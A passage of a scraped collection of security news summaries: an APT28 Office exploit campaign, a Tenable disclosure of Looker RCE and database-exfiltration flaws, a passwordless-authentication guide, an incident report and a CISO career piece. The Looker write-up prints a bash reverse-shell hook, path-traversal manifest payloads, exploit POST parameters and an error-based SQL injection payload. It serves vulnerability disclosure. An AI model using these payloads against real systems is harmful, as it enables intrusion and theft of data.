surface management solutions can help by scanning network and cloud assets for exposures and prioritizing fixes, in addition to monitoring for leaked credentials and other early warning signs of major cyberattacks. Additionally, Cyble’s third-party risk intelligence can help organizations carefully vet partners and suppliers, providing an early warning of potential risks.

    "title": "Russian hackers exploited a critical Office bug within days of disclosure",
    "summary": "Russia-linked attackers are reportedly using a new Microsoft vulnerability as part of a coordinated espionage and malware campaign, Operation Neusploit. The campaign was spotted in January 2026 by Security researchers at ZScaler ThreatLabz, three days after Microsoft issued an urgent patch for the flaw. “In this campaign, the threat actor leveraged specially crafted Microsoft RTF files to exploit CVE-2026-21509 and deliver malicious backdoors in a multi-stage infection chain,” the researchers said in a blog post. “ThreatLabz observed active in-the-wild exploitation on January 29, 2026.” The campaign targeted users in parts of Central and Eastern Europe, including Ukraine, Slovakia, and Romania, with custom social engineering lures. The crafted rich text format (RTF) files triggered the Office vulnerability the moment they were opened, initiating a multi-stage infection chain leading to backdoors and malware implants. Owing to the significant overlap between the tools, techniques, and procedures (TTPs) between the campaign and those of Russia’s General Staff Main Intelligence Directorate (GRU)-affiliated threat group APT28 (aka Fancy Bear ), ZScaler attributed the campaign to the advanced persistent threat (APT) group. Neusploit hooked users through Office Operation Neusploit relies heavily on CVE-2026-21509 , a high-severity bug in Microsoft Office that Microsoft patched on January 26 after reports of active exploitation. The infection begins with victims receiving an email with an RTF attachment that contains a weaponized exploit. When opened, the RTF file causes Microsoft Office to execute code that reaches out to threat actor infrastructure and downloads a dropper DLL . The DLL then executes the rest of the malicious chain. “The threat actor employed server-side evasion techniques, responding with the malicious DLL only when requests originated from the targeted geographic region and included the correct User-Agent HTTP header,” the researchers said. The campaign used two different variants of the dropper DLL, deploying different components for different purposes. One campaign, two infection paths ZScaler found that exploitation of CVE-2026-21509 did not lead to a single uniform payload. Instead, the initial RTF-based exploit branched into two distinct infection paths, each serving a different operational purpose. The choice of dropper reportedly determined whether the attackers prioritized near-term intelligence collection or longer-term access to compromised systems. In one path, the exploit delivered MiniDoor, a lightweight DLL that focused on email theft. The malware modified Windows registry settings to weaken Microsoft Outlook security controls, allowing it to quietly collect and exfiltrate email data to an attacker-controlled infrastructure. The design and functionality of MiniDoor closely resemble earlier APT28 tooling, aligning with the group’s established espionage-focused attacks. The second path involved a more elaborate chain that began with PixyNetLoader, which deployed additional payloads and established persistence using techniques such as DLL proxying and COM object hijacking. This loader ultimately installed a Covenant Grunt implant, used specifically in .NET command and control (c2) framework, giving the attackers sustained remote access through cloud-hosted C2 infrastructure. Mitigation efforts ZScaler recommended that organizations prioritize patching for CVE-2026-21509, noting that APT28 exploited the flaw within days of Microsoft releasing fixes. Systems running unpatched versions of Microsoft Office remain exposed to weaponized RTF documents that require little user interaction beyond opening the file, significantly raising the risk of compromise in email-driven attack scenarios. For defensive analysis, ZScaler shared GitHub repositories, including the Windows scheduled task configuration file and the MiniDoor macro code , illustrating the attack paths used in Operation Neusploit. Additionally, the disclosure shared a list of indicators of compromise (IOCs) to support detection efforts, which included file hashes, malicious domains, and URLs. CISA had added the flaw to its known exploited vulnerabilities (KEV) database, giving Federal Civilian Executive Branch (FCEB) agencies until February 16 to patch their systems.",

    "title": "LookOut: Discovering RCE and Internal Access on Looker (Google Cloud & On-Prem)",
    "summary": "Tenable Research discovered two novel vulnerabilities in Google Looker that could allow an attacker to completely compromise a Looker instance. Google moved swiftly to patch these issues. Organizations running Looker on-prem should verify they have upgraded to the patched versions. Key takeaways Two novel vulnerabilities: Tenable Research discovered a remote code execution (RCE) chain via Git hook overrides that could lead to cross-tenant access, and an internal database exfiltration flaw via internal connection abuse ( CVE-2025-12743 ) that could lead to the exposure of sensitive data. We have collectively dubbed both vulnerabilities as “LookOut.” Cross-tenant breach potential: The RCE vulnerability bypassed cloud isolation in Google-hosted environments, creating a pathway for attackers to potentially \"hop\" between different customer environments and access private data. Unpatched on-premises risk: While Google patched the vulnerabilities on its managed Looker in Google Cloud, organizations running customer-hosted or on-premises versions remain critically exposed until they apply the necessary security patches. Google Looker stands out as a powerful business intelligence platform. It allows organizations to define data relationships using LookML, a Google proprietary modeling language, and visualize that data in real-time. Because Looker is often the central nervous system for an organization's most sensitive data, the security of its underlying architecture is crucial. Looker operates under two primary deployment models: A SaaS version of Looker, where the instance is fully managed by Google Cloud; and customer-hosted version, where the organization deploys the Looker JAR file on its own infrastructure (on-premises or private cloud). This distinction is critical to the impact of our findings: while SaaS environments rely on the provider’s security controls, customer-hosted instances place the full burden of infrastructure security and patching on the organization using Looker. A different, but similarly-named product -- Looker Studio -- isn't impacted by our vulnerability findings. LookOut could allow an attacker to completely compromise a Looker instance: A remote code execution (RCE) chain that grants an attacker the ability to run arbitrary code on the Looker server. In practical terms, this provides full administrative access to the underlying infrastructure, allowing an attacker to steal sensitive secrets, manipulate data, or pivot further into the internal network. In cloud instances, the vulnerability could potentially lead to cross-tenant access. An authorization bypass that allowed attackers to attach to Looker’s internal database connections and exfiltrate the full internal MySQL database via error-based SQL injection. These issues were reported to Google via the Cloud Vulnerability Reward Program (VRP) and fixed promptly. We want to thank Google’s Cloud VRP for the support, collaboration, and professionalism. Organizations using customer-hosed and on-prem versions of Looker are advised to deploy available patches as soon as possible and read the following security bulletin . Vulnerability #1: RCE via Git hooks config override and path traversal The first vulnerability exploits how Looker handles remote dependencies in LookML projects, leading to arbitrary code execution. An attacker could create a malicious LookML project to run code on Looker’s server. The exploit chain We reviewed Looker’s source code and achieved a full RCE, by chaining the following primitives together: Arbitrary directory creation Path traversal in multiple inputs Race condition This effectively gave us control over the Looker instance, potentially allowing us to access secrets and cross-tenant data. Background The target: LookML project manifests and Git hooks Looker allows developers to define \"remote dependencies\" in a file called manifest.lkml . This feature lets you import LookML views and models from other Git repositories. A standard dependency looks like this: LookML remote_dependency: public_project { url: \"https://github.com/llooker/google_ga360\" ref: \"07a20007b6876d349ccbcacccdc400f668fd8147f1\" } LookML project example When you save this, Looker clones that repository into: /home/looker/looker/remote_dependencies/ /. Crucially, every Looker project is a Git repository. Looker uses Git hooks and hardcodes the Git hooksPath in the .git/config file to a safe location: ../../git_hooks/ . The spark We knew that every LookML project is, at its core, a Git repository. That means somewhere on the file system, there is a .git folder governing its behavior. We navigated to one of the project directories on our testing instance, specifically models-user-looker, and opened the repository-specific configuration file: .git/config . Here is what we saw: Our eyes immediately locked onto the last line: hooksPath . For those unfamiliar with Git internals, hooksPath is a configuration variable that tells Git, \"Don't look for hook scripts in the default .git/hooks folder. Look here instead.\" Git hooks are powerful. They are scripts (bash, python, etc.) that execute automatically when certain events happen, like a commit or a push. Looker, seemingly aware of this danger, had hardcoded this value to point to ../../git_hooks/ , a directory outside the project root that is supposed to be read-only and managed by the system. But then we looked more closely at the path structure. The value was: ../../git_hooks/my_remote_project_name . We asked ourselves: Where does that project name string come from? It comes from the manifest.lkml file we define as a user: remote_dependency: my_remote_project_name { ... } That string isn't generated by the system; it’s input we control. And it’s being concatenated directly into a file path string in the config. Our gears started turning immediately. If Looker is just taking our string and pasting it into that config file, what prevents us from using standard directory traversal characters? If we named our project ../../../../tmp/pwned , would the config result in hooksPath = ../../git_hooks/../../../../tmp/pwned ? If that hypothesis held true, we effectively had a \"Git hook configuration override\" primitive. We could point the hooks path away from Looker’s folder and point it to any directory on the server where we could write files. And if we can tell Git to run scripts from a folder we control, we can execute arbitrary code. This was the starting point. Ingredient 1: The config path traversal (the setup) Our first thought was simple: Can we break out of the folder structure using the dependency name? We crafted a manifest where the dependency name contained traversal characters: remote_dependency: ../../../../../../my_custom_hooks_folder { url: \"https://github.com/llooker/google_ga360\" ... } The remote dependency name is used as the value injected into the hooksPath value, while the ref points to the Git repository whose .git folder will be overridden with this injected value. The repository we chose to override is the one where Git operations are executed when using the LookML project regularly, allowing us to trigger the hooks. It worked. Looker accepted the name and wrote it directly into the .git/config hooksPath . Instead of pointing to the safe folder, the config now pointed to: ../../git_hooks/../../../../../../my_custom_hooks_folder The issue? The config path traversal did not really work. Our malicious custom hooks did not run. Ingredient 2: The directory creation (the roadblock) We had a path traversal, but we hit a wall. For the traversal to work, the base directory ( git_hooks ) had to exist. We were not sure why, but in the environment we were attacking, this folder wasn't there. The file system would reject the path if one of the directories defined in the traversal didn't exist. We then thought we could try to find a primitive to create an arbitrary directory. We realized the remote_dependency logic does more than just write configs; it performs git clones. By manipulating the ref (the branch or commit hash) and the name of another dependency, we could trick the system. We created a dummy dependency: remote_dependency: git_hooks_creator { url: \"https://github.com/llooker/google_ga360\" ref: \"../../git_hooks\" } This payload forced the system to try and clone data into a path named ../../git_hooks . As a side effect of this operation, the system created the git_hooks directory to satisfy the request. Now the path existed. The traversal was valid. Ingredient 3: The weaponized pepo (the payload) We had a way to redirect the hooksPath (Ingredient 1), and a way to ensure the directory existed (Ingredient 2). Now the critical question: What do we put inside that directory? Pointing the configuration to a folder is useless if that folder is empty or contains non-executable files. For Git to execute a hook (like pre-commit or post-commit ), two conditions must be met: The file must exist with the correct name (e.g., pre-commit ). The file must have the executable permission bit set ( +x ). This created a challenge. Typically, when you clone a repository, Git doesn't automatically trust or preserve the file permissions from your local machine blindly -- with one major exception. Git does record the executable bit (100755) in its internal tree objects if it’s explicitly told to do so. If we just created a script on our machine, ran chmod +x script.sh , and pushed it, the executable bit might be preserved depending on the client’s OS and configuration. We wanted a guarantee. We needed to manipulate the Git index directly to ensure that any client cloning this repo (including the Looker server) would be forced to write that file to disk as an executable. We used the following Git command on our attacker machine: git update-index --chmod=+x hook Why this Git command matters: Standard chmod changes the file system metadata on your computer. git update-index changes the metadata in the Git index itself. It tells Git: \"I don't care what the file system says; when you store this file in the repo object, mark it as an executable binary.\" So, the attack setup looked like this: We created a malicious repository hosted on GitHub. Inside, we placed a bash script named pre-commit containing our reverse shell payload. We forced the executable bit in the Git index. We pushed this \"weaponized repo\" to the web. Now, when Looker cloned this \"innocent\" remote dependency (using the directory creation primitive from Ingredient 2), it dutifully followed the instructions in the Git tree object. It wrote our pre-commit script to the disk and set the executable bit . Because of our config path traversal (Ingredient 1), Looker’s config was now pointing the hooksPath to the exact folder where this cloned, executable, and malicious script was waiting. The trap was set. The payload script: #!/bin/bash /bin/bash -i >& /dev/tcp/10.0.0.1/1337 0>&1 Ingredient 4: Git hooks won’t run We had the config pointed at our script. We had the script in place. But for some reason, the hooks did not run when we tried to run the exploit. We found out that the problem was JGit . By default, Looker uses JGit (a Java implementation of Git) for all repository operations. JGit doesn't support Git hooks, therefore, it does not run scripts from hooksPath the way native Git does. However, we knew there should be a Git implementation in the code base so we kept reviewing Looker’s code. We found a specific deployment flow that allows deploying a Looker project with an attached Git repository, where Looker executes real Git commands instead of JGit. Looker then falls back to executing real system Git commands. Moshe Bernstein , Tenable Senior Security Researcher, played a pivotal role here. He helped hunt down this specific needle in the haystack. He found the exact parameters that needed to be set by following the code execution flow from sending the project creation request to the endpoint to creating a Git repository inside Looker that works with Git and not JGit. By sending a specific set of POST parameters, we could create a repository that works with Git in the code flow, and not with JGit. These specifically were the POST parameters to create a Looker Git repository that works with Git commands when interacted with: git_auth_configured=true&git_application_server_http_scheme=&git_application_server_http_port=&skip_tests=true&reset_deploy_key=false Ingredient 5: The race condition (the trigger) There was another problem: before running a Git command, Looker overwrites the .git/config as part of the code flow. This leads to the hooksPath value being reset and changed to the default and safe value. It cleans up our mess before we can exploit it. To tackle the problem, this is where the race condition comes in: Looker starts the operation. Looker writes the Safe config. Looker executes git commit . We needed to inject step 2.5: Overwrite the config with our malicious path. Because the file system write (the config update) and the execution (the commit) are distinct events, we could hammer the API. We set up a script to spam the \"save manifest\" endpoint (which writes our malicious traversal to the config) while simultaneously triggering the \"commit\" endpoint. After a few tries, we won the race. The system executed git commit, checked the config (which we had just overwritten), followed the hooksPath to our malicious directory, and executed our script. As an example, we dropped a txt file inside the /tmp directory: Result: RCE on the Looker instance For Looker’s Google-managed instances in Google Cloud Platform (GCP), the RCE could affect cross-tenant victims. By accessing a shared secrets folder, attackers could laterally move to other GCP customers. For on-premises and self-hosted versions, the threat shifts from cross-tenant access to code execution, leading to internal lateral movement. Vulnerability #2: Full internal database exfiltration The second vulnerability allowed us to peer behind the curtain of Looker's internal management. Internal connections While poking inside Looker’s logs, we found out that Looker manages its own metadata, users, and permissions using an internal MySQL database with internal database connections. Each Looker project has a Looker instance with its own MySQL internal database. Access to these internal connections is strictly restricted and should not be accessible to standard users or developers. Yet, one of the logs leaked the internal Looker database connection, named looker__ilooker . Proxying to internal connections When creating a new LookML project, customers should select a connection to their own database to use their data inside the created project. The UI restricts users from selecting database connections that they don’t own and only lists the database connections that they created and are available to them. Armed with the knowledge that internal connections and internal databases are used to manage Looker instances, we were able to intercept the HTTP request and modify the connection parameter directly. We could then bypass the UI validation and attach to an internal connection. We simply proxied the request and changed the connection name to looker__ilooker . Looker accepted the request, attaching our user-controlled project to its highly sensitive internal database. Exfiltrating data with error-based SQL injection With the project attached to the internal database, we still needed a way to extract data. We turned to Looker's \"data tests\" feature. In LookML tests, the “sql” field lets you run a custom SQL query directly against the attached database connection to validate data conditions. Luckily for us, in the project we just created, the attached database connection is the internal Looker database we attached. Even though LookML data tests allow a sql field, Looker still controls how that SQL is executed. The SQL is expected to be a Boolean-style validation query, results are not fully returned to the user, and you typically only see pass/fail, not raw query output. So while the SQL runs, its output isn’t exposed in a way that lets you read any meaningful data. We came up with the idea of creating a LookML test that included an error-based SQL injection payload inside a dimension definition, to leak data with errors: LookML dimension: id { type: number sql: updatexml(null, concat(0x7e, IFNULL((SELECT name FROM project_state LIMIT 1 OFFSET 0), 'NULL'), 0x7e, '///'), null) ;; } When we ran the data test, the underlying database attempted to execute this SQL. Because of the updatexml function, the database threw an error that contained the result of our subquery. The result: XPATH syntax error: '~dev::uri:classloader:/helltool/' By iterating through offsets, we could dump the entire internal database - users, configurations, and secrets - byte by byte. After confirming that we could have leaked data with the vulnerability, we did not escalate further. Conclusion and next steps These two vulnerabilities demonstrate that even mature, widely used platforms can harbor significant security risks. The \"LookOut\" vulnerabilities serve as a reminder that Business Intelligence (BI) platforms are high-value targets. The discovery of a cross-tenant RCE path underscores the complexity of securing cloud environments. It’s hard to secure systems while giving users highly powerful capabilities, such as running SQL and indirectly interacting with the file system of the managing instance. The bottom line: While Google has moved swiftly to patch these issues, the burden of security now shifts to customer-hosted administrators. Organizations running Looker on-premises must verify they have upgraded to the patched versions. If your Looker instance is self-hosted, we recommend upgrading your Looker instances to one of the following versions: 25.12.30+ 25.10.54+ 25.6.79+ 25.0.89+ 24.18.209+ Note: releases 25.14 and above are not affected by these security issues. Tenable Research has disclosed all of these issues to Google and directly worked with them to fix the vulnerabilities. The Google security bulletin can be seen here .

    "title": "Zero trust in practice: A deep technical dive into going fully passwordless in hybrid enterprise environments",
    "summary": "Over the past three years, I’ve led passwordless migration initiatives at three Fortune 500 companies, and I can tell you with confidence that eliminating passwords from a hybrid Active Directory and Microsoft Entra ID environment is one of the most rewarding — and most underestimated — technical challenges in modern identity management. The theoretical appeal is obvious: no passwords means no credential compromise, phishing becomes exponentially harder and your security posture fundamentally shifts from “prevent breaches” to “assume breach.” But the reality of implementation in environments spanning on-premises and cloud infrastructure? That’s where the genuine complexity lives. Most organizations I’ve worked with start this journey with romantic notions of flipping a switch and sailing into a passwordless future. What they discover instead is that achieving true passwordless authentication requires rethinking identity architecture from the ground up. It’s not about swapping one authentication method for another — it’s about fundamentally restructuring how you verify identity across every layer of your infrastructure. The transition demands careful planning, technical rigor and unwavering commitment to security principles over convenience. Prerequisites: Building the foundation before the migration Before we can talk about passwordless authentication, we need to address what I call the “prerequisite triangle”: cloud Kerberos trust, device registration and Conditional Access policies. Skip any one of these, and your migration will stall before it gains momentum. Cloud Kerberos trust is the unsung hero of hybrid passwordless deployments. When I started working on my first full migration, I underestimated how critical this piece was. Traditional Kerberos assumes a managed network with domain controllers you control. Cloud Kerberos allows your cloud-based services to issue Kerberos tickets to hybrid-joined devices without requiring a domain controller on the internet. This is your bridge between on-premises and cloud identity, and it’s non-negotiable for seamless hybrid authentication. The mechanics of Kerberos itself haven’t changed significantly since its introduction in the 1980s, but extending it to cloud environments required a fundamental rethinking of how authentication tickets are issued and validated across trust boundaries. Getting cloud Kerberos working requires Azure AD Connect to run version 2.0 or later with the cloud sync agent configured for password hash synchronization (even if you’re not using it for authentication — this remains a prerequisite). Your hybrid-joined devices need to be running Windows 10 20H2 or later, and they must have reliable network connectivity to both your on-premises domain controllers and Azure. In one deployment, my team spent two weeks troubleshooting authentication failures before discovering that a firewall rule was blocking the necessary communication on port 88. This single finding reinforced why network validation should occur before pilot rollout, not during. Device registration and management come next. Every device attempting passwordless authentication must be either Azure AD joined, hybrid AD joined or registered with Entra ID. I’ve found that hybrid-joined devices work best in truly hybrid environments because they maintain connection to on-premises infrastructure while gaining cloud identity benefits. Your Intune Mobile Device Management deployment becomes critical here — devices must be compliant with your policies before they’re trusted for passwordless sign-in. This means ensuring that disk encryption is enabled, that antivirus is running and that devices meet your organization’s baseline security posture. The compliance baseline isn’t punitive; it’s the minimum acceptable security threshold. Conditional Access policies form the final leg of the prerequisite triangle. These aren’t optional — they’re how you enforce the “trust zero, verify always” principle of Zero Trust. The National Institute of Standards and Technology defines Zero Trust architecture as requiring continuous verification and explicit access grants based on all available data points. I configure policies that require device compliance, enforce multi-factor authentication for sensitive operations, and block legacy authentication entirely. The policy I typically recommend as a starting point requires hybrid-joined devices, compliant Intune status and MFA for all access to on-premises resources, while allowing seamless sign-in for fully compliant devices. This creates a virtuous cycle where security and user experience reinforce each other. Architecture decisions: Hybrid authentication flows and Windows Hello for Business Once your prerequisites are in place, you face critical architectural decisions that will shape your deployment for years to come. The primary decision point is whether to use Windows Hello for Business, FIDO2 security keys or phone sign-in as your primary authentication mechanism. In my experience, Windows Hello for Business is the foundation for hybrid environments. It leverages biometric or PIN authentication on the device itself, preventing credentials from ever being transmitted across the network. When a user signs in with Windows Hello, they’re not sending a password or even a credential — they’re using a private key stored in the device’s Trusted Platform Module (TPM) to prove their identity. For hybrid-joined devices, this works seamlessly because the device can authenticate both to your on-premises domain controller (using cloud Kerberos) and to Entra ID in a single operation. This eliminates the attack surface that traditional password-based authentication creates. Organizations seeking more information on passwordless authentication approaches can review guidance from the Cybersecurity and Infrastructure Security Agency , which has published extensive recommendations on moving beyond passwords. However — and this is crucial — not all devices have TPM 2.0, which is required for the most secure implementations. In one organization where we deployed to 15,000 devices, we discovered that 12% didn’t meet hardware requirements. We ended up implementing a phased approach: Windows Hello for Business on compliant devices, with FIDO2 security keys as the backup for devices that couldn’t support it. FIDO2 keys, which conform to the open FIDO2 standard , are also your answer for scenarios where you need physical authentication tokens — particularly useful for privileged accounts or high-risk scenarios. They’re resistant to phishing and account takeover because possession of the physical token is required. Research from the Identity Defined Security Alliance has shown that organizations using FIDO2-compliant authenticators reduce account compromise incidents by over 90% compared to password-dependent systems. The architectural decision also includes determining how you handle legacy applications that still require passwords. Your options are limited: implement a passwordless-compatible application gateway, deprecate the application entirely or use Entra ID’s smart lockout and password protection features to reduce risk while you transition. I typically recommend treating legacy application support as a temporary bridge, not a permanent architecture. Organizations that treat this as permanent inevitably find themselves maintaining password infrastructure indefinitely, undermining the entire security posture you’re building. Migration workflows: The step-by-step reality The migration itself needs to follow a structured approach that I’ve refined across multiple organizations. Start with a pilot group — I recommend between 50 and 200 users who are willing to accept some friction in exchange for security improvements. This group should include IT staff and security-conscious users who can provide meaningful feedback without becoming frustrated with early-stage issues. For the pilot phase, configure Windows Hello for Business using Group Policy on your on-premises infrastructure for domain-joined devices, while using Intune policies for cloud-managed devices. Configure Entra ID to require Windows Hello as the preferred authentication method. During this phase, maintain traditional password authentication as a fallback — not because you lack confidence, but because user trust in the system matters. I typically see a three to four week period where you’re supporting both methods while users adapt. This period provides invaluable data about real-world usage patterns and edge cases. The second phase involves expanding to department-level groups. At this point, you should have identified and documented all the troubleshooting patterns that emerged in your pilot. Common issues I’ve encountered include PIN complexity policies that conflict with Windows Hello configuration, credential caching issues on hybrid-joined devices and confusion around how to recover access when a device is lost or compromised. A well-designed help desk knowledge base at this stage prevents the third phase from becoming a support crisis. The final phase is organization-wide rollout with password authentication disabled. This is where you must have complete confidence in your fallback mechanisms and your support team’s ability to handle edge cases. I recommend maintaining password authentication for break-glass scenarios (though heavily restricted and logged) for at least 90 days after full rollout. This safety net provides psychological comfort to leadership and creates a genuine escape hatch if something unexpected occurs at scale. Troubleshooting patterns and lessons learned After guiding three large-scale deployments, I’ve compiled a list of issues that deserve attention before they become production problems rather than documented solutions. Device compliance checking often becomes a bottleneck. If your Intune policies are too strict, you’ll have users locked out of passwordless authentication because their devices are non-compliant. The solution isn’t to loosen policies — it’s to automate compliance remediation. Use Intune’s remediation scripts to automatically enable required features and update settings rather than blocking access. When a device becomes non-compliant due to a missing security update, remediation scripts can deploy that update silently, restoring access without support interaction. Cloud Kerberos ticket refresh failures occur when devices lose network connectivity. I’ve found that users appreciate understanding that brief network outages might require them to use an alternative authentication method temporarily. Documenting this expectation and providing clear error messages reduces support burden significantly. One organization I worked with created a simple status dashboard showing cloud connectivity health, which dramatically improved user confidence in the system. The Windows Hello PIN reset flow needs careful planning. Users will forget PINs — not because they’re careless, but because they now have one less password to remember and are redirecting that cognitive effort elsewhere. Implement Entra ID’s self-service PIN reset capability, but test it thoroughly in various network conditions. I discovered in one deployment that users couldn’t reset their PIN while offline, which created support tickets even though the feature was technically available online. A simple offline reset option would have eliminated those tickets. Recovery mechanisms deserve special attention. What happens when a user’s device is stolen? What if the TPM fails? What if they forget their PIN and can’t reach your self-service portal? Document these scenarios and test them with your help desk before full rollout. I’ve found that help desk confidence in recovery procedures directly correlates with user confidence in passwordless authentication. The endpoint: A genuinely passwordless enterprise Reaching true passwordless authentication in a hybrid environment means accepting that you’re building a new security model, not just changing how users authenticate. The effort required is substantial, but the security improvement is profound. I’ve watched organizations move from breach-heavy authentication scenarios to Zero Trust architectures where every access request is evaluated in context, and where the compromise of a single device doesn’t cascade into wholesale account takeover. The passwordless journey isn’t a destination you reach in months — it’s a direction you move in consistently. The organizations that succeed view passwordless migration not as a project with an end date, but as a fundamental shift in how they think about identity and trust. They maintain that momentum by continuously updating policies, expanding coverage to new applications and use cases, and refining their architecture as technology evolves. The view from the other side is worth the journey. Once you’ve lived in a passwordless environment, going back to password-based authentication feels like removing your seatbelt during a drive. The risk seems obvious in retrospect, and the safety you’ve gained becomes non-negotiable. This article is published as part of the Foundry Expert Contributor Network. Want to join?",

    "title": "Cybercriminals set sites on identities",
    "summary": "Eye Security’s 2026 State of Incident Response Report shows that cyberattacks on companies are increasingly going undetected, and the damage occurs within minutes. According to the report, attackers are now focusing less on hacking systems and more on exploiting existing access points. Identity-based attacks dominate the field, with passwords being involved in 97% of incidents tracked by Eye Security. Abuse of legitimate accounts is a primary cause of cloud security incidents and drives the business of initial access brokers. However, the study’s results show that attackers’ fundamental methods remain unchanged. “Even in 2026, compromise will still begin with phishing, exploiting misconfigured or vulnerable internet-enabled systems, social engineering, or attacks via the software supply chain,” explains Lodi Hensen, VP of security operations at Eye Security. BEC attacks are particularly common Business email compromise (BEC) is the most common form of attack, according to the study: More than 70% of incidents fall into this category. In 40% of these cases, phishing served as the initial point of entry. Analysts say that BEC attacks can remain undetected for weeks without continuous monitoring. Furthermore, the study highlights that ransomware remains one of the biggest threats. “The proliferation of Ransomware-as-a-Service (RaaS), BuilderLeaks, and access broker marketplaces has lowered the barriers to entry and created a professional ecosystem,” the authors explain. The report reveals a dangerous trend: the commercialization of insider knowledge. “Groups like ShinyHunters are actively recruiting employees to buy access credentials. This blurs the line between external attacks and insider threats,” the security researchers explain. “For ransomware actors, this purchased access is often faster and more reliable than technical hacking.” Companies in the industrial, construction, and transport and logistics sectors are particularly affected. Many ransomware attackers exploit everyday vulnerabilities: unprotected applications, insecure remote access, or phishing emails through which employees unknowingly disclose login credentials. The analysis evaluated a total of 630 security incidents in Europe from 2023 to 2025.",

    "title": "Should I stay or should I go?",
    "summary": "Even the most seasoned CISOs sometimes run into insurmountable roadblocks at their organizations. Despite their best efforts at building relationships, and even with their technical depth and business acumen, they can’t garner the support needed to protect their organizations — and themselves — from pending disaster. In the big picture, CISO roles are hard, and so the majority of CISOs switch jobs every two to three years or less . Lack of support from senior leadership and lack of budget commensurate with the organization’s size and industry are top reasons for this CISO churn, according to The life and times of cybersecurity professionals report from the ISSA. More specifically, CISOs leave on account of limited board engagement, high accountability with insufficient authority, executive misalignment, and ongoing barriers to implementing risk management and resilience, according to an ISSA spokesperson. Many of these roadblocks are common across industries, so how does a CISO know when it’s time to move on? They look for the flags. Red flag: Playing lip service A common red flag and reason CISO’s leave their jobs is because leadership is paying “lip service” to auditors, customers and competitors, says FinTech CISO Marius Poskus, a popular blogger on security leadership who posted an essay about resigning from “security‑theater roles.” So, even before signing onto a new job, Poskus suggests looking for recent events proceeding the organization hiring its first-ever CISO. “I see this often. Usually after an impactful breach, they negotiate fines down by saying they’ll hire their first CISO. In fact, a friend in New Zealand reached out to me today with just such a story,” he tells CSO. Other indicators that executives are playing lip service to security include constant resource denials, lack of risk ownership, and failure to sign off on identified risks at the top level, leaving the CISO vulnerable. To this end, Poskus shared a security executive charter that outlines responsibilities of senior executives’ accountability around the cybersecurity program. And, since lack of access to the board is a top-cited reason for leaving, Poskus says to look for problematic reporting lines that block access to executives, such as through a boss who refuses to report issues and requests to executives. Red flag: Cognitive disconnect Lack of access to executives and the board comes up repeatedly in Cybersecurity Ventures reports as a top reason CISO’s decide to leave their jobs, according to Steve Morgan, founder of Cybersecurity Ventures. He cites lack of support as another top reason CISO’s leave. Splunk’s 2025 CISO report found 29% of respondents had adequate budget compared to 41% of boards who felt cybersecurity budgets were adequate. This cognitive disconnect was clear in Nawab Kabir’s case. He declined on the prospect of taking a full-time CISO role to become a fractional CISO after a merger left him reporting to an IT director rather than the CEO as he previously had reported to. “One of the key red flags for CISO’s is if their boss, usually the CIO or CTO, repeatedly blocks attempts to escalate missions to the CEO by downplaying the real risk, asking the CISO to accept that risk, and saying that the CEO simply doesn’t care. So, the risk never gets mentioned in executive leadership meetings,” Kabir says. After the merger, the initiatives and intervention strategies he developed never got past the director of IT (who came from the merger) to executive leadership. So, Kabir knew it was time to leave. “That’s one of the reasons I became a fractional cybersecurity leader, which I love because now I’m being hired to make a difference at my client companies.” Red Flag: Pushing ethical boundaries Above all these, the biggest red flag is when leadership pushes against your professional and personal ethics. For example, when a CEO or board wants to conceal compliance gaps, cover up reportable breaches, and refuse to sign off on responsibility for gaps and reporting failures they’ve been made aware of. “This happens more often than we know because most CISOs won’t make public what happened behind the scenes that made them quit, especially when they’re looking for new jobs,” Poskus explains. “Your integrity is your most important asset, so that’s the biggest red flag when we talk about leaving a role rather than staying and fighting.” In these types of scenarios, the CISO likely lacks critical allies within the organization. Acknowledge this sense of vulnerability, Poskus advises, because it’s a huge red flag. Human resources and legal teams in these situations won’t help because they owe their loyalty to the business, he adds. Such was the case with former Uber CISO Joe Sullivan who was thrown under the bus by Uber’s shady leadership after a 2016 breach. In contrast, SolarWinds CISO Tim Brown felt fully supported after a historic supply chain hack in 2020 spread to 18,000 business clients through its Orion network management product patch update system. “Joe was in such a difficult situation. The company was aggressive towards him, which was so different from my experience at SolarWinds,” says Brown, who had responded to the breach. Green flag: They have your back In contrast to Sullivan’s employer, Brown shares that everyone involved in responding to the SolarWinds breach — from IT responders to communications, legal, and executives — felt the same way he did in terms of making things right for clients and regulators. “My situation was difficult, but manageable in many ways because of that support from my team. From day one, we had no question about doing the right thing. We decided on transparency to our customers all the way through the SEC filings,” Brown explains. Even as a new CEO came onboard under a planned transition shortly after the breach, and as the SEC charged SolarWinds and Brown with fraud for certifying compliance with SolarWinds security shortly before the sophisticated supply-chain hack occurred, Brown has felt ongoing support. Given his access to the board and CEO, Brown knew well before the breach that the company had his back. He also points to another green flag: The company’s commitment to tabletop exercises of impactful breaches. Throughout the practice scenarios, teams worked together under a customer-centric mandate that advocated transparency and education, the same playbook that they followed in the 2020 breach. Ultimately, the SEC dropped its charges against Brown , and in November, he attended a virtual toast in his honor to celebrate the SEC dropping the case against him “without prejudice.” More than 200 CISOs of top companies joined, including co-host Joe Sullivan. Ultimately, as Brown had hoped, the entire experience provided teachable moments to help push the CISO role up the maturity curve. Changing internal mindsets As CISOs burn out or leave under stressful circumstances, many turn to fractional work as Kabir has. And, in his case, working with new clients gives him plenty of opportunities to turn red flags into green flags. For example, he points to lack of board access and resources. In many cases he steps into, the former cybersecurity leaders didn’t understand the business and talked technically over their executives’ heads. As a result, he’s had to convert fatigued, resistant executive teams that don’t want to repeat those experiences with a new cybersecurity leader. For these clients, he likes to call “all hands” to a meeting and conduct what he calls interactive “business continuity stress tests” in table-top scenarios that impact a revenue-generating activity. “Take manufacturing, if this machine is down for six to eight hours what would be our revenue costs associated with this downtime? That gets attention,” Kabir says. “Then finance starts talking within their teams and it goes beyond that to the CEO because now it’s seen as a business issue.” CISOs, then, can change culture to turn a red flag into a green flag. But knowing when and how to do so depends on the indicators mentioned. Even with a fractional role, CISOs should still expect some of their clients to try and compromise ethics by covering up findings for example. Fortunately, that red flag usually reveals itself early in the audit, when the executives and business units appear afraid to answer questions as if trying to hide something. “A lot of red flags have to do with lack of security culture or mismatch in understanding the risk tolerance of the company and what the actual risks are. This red flag goes beyond: If they don’t want to be questioned about what they’ve done so far, that is a huge red flag that they’re covering something up,” Kabir explains. To be safe, he carries indemnity insurance and retains his own legal counsel — as should all CISO’s with large enough salaries who are reporting to the board and C-suite. Because, as in the case with Joe Sullivan and many other examples that go unreported, CISO’s can’t count on their organizations to have their backs legally or professionally should the big one hit — especially if those executives, by virtue of their unresponsiveness and lack of support, are the cause of it.",

